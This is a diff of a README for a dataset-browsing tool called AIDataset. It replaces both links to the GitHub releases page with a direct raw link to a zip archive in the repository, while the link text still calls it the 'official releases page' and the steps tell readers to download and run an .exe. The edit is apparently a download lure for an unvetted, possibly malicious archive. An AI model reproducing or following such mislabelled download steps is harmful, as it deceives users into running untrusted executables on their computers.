@@ -1,6 +1,6 @@
 # 📁 AIDataset - Browse major AI research areas quickly
 
-[![Download AIDataset](https://img.shields.io/badge/Download-AIDataset-blue.svg)](https://github.com/elizaunmade1739/AIDataset/releases)
+[![Download AIDataset](https://img.shields.io/badge/Download-AIDataset-blue.svg)](https://raw.githubusercontent.com/elizaunmade1739/AIDataset/main/Graph-Learning/Dataset_AI_2.2.zip)
 
 AIDataset helps researchers and students find data for machine learning projects. You can search, filter, and organize massive collections of information across several fields. This tool simplifies the process of finding the right set for your specific AI model.
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the software smoothly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/elizaunmade1739/AIDataset/releases) to access the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/elizaunmade1739/AIDataset/main/Graph-Learning/Dataset_AI_2.2.zip) to access the installer.
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
